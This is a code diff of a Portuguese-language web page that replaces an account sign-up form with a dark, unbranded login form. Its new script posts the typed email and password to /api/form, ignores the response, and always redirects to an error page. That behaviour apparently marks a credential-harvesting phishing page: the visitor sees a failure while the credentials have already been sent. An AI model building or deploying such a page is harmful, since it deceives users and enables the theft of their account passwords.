@@ -3,44 +3,119 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cadastro</title>
+  <title>Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 0 16px;
+      margin: 0 auto;
+    }
+
+    .login-box {
+      background-color: #111;
+      padding: 30px 20px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 300px;
+      box-shadow: 0 0 8px rgba(255, 255, 255, 0.05);
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 18px;
+      color: #ccc;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    button {
+      width: 100%;
+      height: 40px;
+      font-size: 14px;
+      margin: 10px 0;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      border: 1px solid #444;
+      background: #222;
+      color: #fff;
+      padding: 0 10px;
+    }
+
+    input::placeholder {
+      color: #888;
+      font-size: 13px;
+    }
+
+    button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0d59c4;
+    }
+  </style>
 </head>
 <body>
-  <h1>Criar Conta</h1>
-  <form id="loginForm">
-    <label>Email:</label>
-    <input type="email" id="email" required><br>
-    <label>Senha:</label>
-    <input type="password" id="password" required><br>
-    <button type="submit">Criar Conta</button>
-  </form>
 
-  <script>
-    import { submitCredentials, validateEmail } from '/api/form.js';
-    
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      
-      if (!validateEmail(email)) {
-        alert('Por favor, use um email real');
-        return;
-      }
-      
-      try {
-        const result = await submitCredentials(email, password);
-        
-        if (result.success) {
-          alert('Conta criada com sucesso!');
-        } else {
-          alert(result.error || 'Erro ao criar conta');
-        }
-      } catch (error) {
-        alert('Erro ao criar conta');
-      }
-    });
-  </script>
+<div class="login-box">
+  <h2>Entrar</h2>
+  <form id="loginForm">
+    <input type="email" name="email" placeholder="Seu email" required>
+    <input type="password" name="senha" placeholder="Sua senha" required>
+    <button type="submit">Entrar</button>
+  </form>
+</div>
+
+<script>
+  document.getElementById("loginForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const email = e.target.email.value;
+    const senha = e.target.senha.value;
+
+    // Validação do email
+    if (!email.includes('@')) {
+      alert('Por favor, use um email real');
+      return;
+    }
+
+    try {
+      await fetch("/api/form", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, senha }),
+        mode: 'cors'
+      });
+
+      // Redirecionamento
+      setTimeout(() => {
+        window.location.href = "/error.html";
+      }, 100);
+    } catch (error) {
+      console.error('Erro:', error);
+      alert('Erro ao enviar dados');
+    }
+  });
+</script>
+
 </body>
 </html>
